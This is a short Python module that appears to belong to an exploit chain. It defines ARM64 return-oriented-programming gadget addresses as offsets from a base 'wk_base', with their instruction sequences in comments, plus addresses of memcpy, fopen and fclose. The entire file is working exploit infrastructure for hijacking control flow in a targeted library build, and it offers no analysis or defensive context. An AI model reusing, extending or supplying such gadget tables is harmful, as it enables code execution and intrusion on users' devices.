from relocatable import wk_base


class Gadgets200Wk:
    pop_0000_x22_x21_x20_x19_x29_x30 = wk_base + 0x7295bc # ldp x29, x30 [sp, #0x40] ; ldp x20, x19 [sp, #0x30] ; ldp x22, x21 [sp, #0x20] ; add sp, sp, #0x50 ; ret
    load_x0_to_x4_blr_x8 = wk_base + 0x8c82f4 # mov x0, x23 ; mov x1, x19 ; mov x2, x22 ; mov x3, x21 ; mov x4, x20 ; blr x8
    #load_x1_to_x4_blr_x8 = wk_base + 0x8c82f8
    pop_00000000_x28_x27_x26_x25_x24_x23_x22_x21_x20_x19_x29_x30 = wk_base + 0x9d31a4
    #blr_x22_pop_0000_x22_x21_x20_x19_x29_x30 = wk_base + 0x7295b8
    load_x5_to_x7_trash_stack_blr_x8 = wk_base + 0xf25a88 # mov x5, x21 ; mov x6, x20 ; mov x7, x19 ; str x28, [sp, #0x10] ; str w27, [sp, #8] ; str x23, [sp] ; blr x8
    mov_x8_x21_mov_x0_x20_mov_x1_x19_blr_x22_pop_0000_x22_x21_x20_x19_x29_x30 = wk_base + 0x7295ac

    load_x1_to_x4_blr_x8 = load_x0_to_x4_blr_x8 + 0x4
    blr_x22_pop_0000_x22_x21_x20_x19_x29_x30 = mov_x8_x21_mov_x0_x20_mov_x1_x19_blr_x22_pop_0000_x22_x21_x20_x19_x29_x30 + 0xc


class Functions200Wk:
    memcpy = wk_base + 0xf2e2f8
    fopen = wk_base + 0xf2f688
    fclose = wk_base + 0xf2f6a8
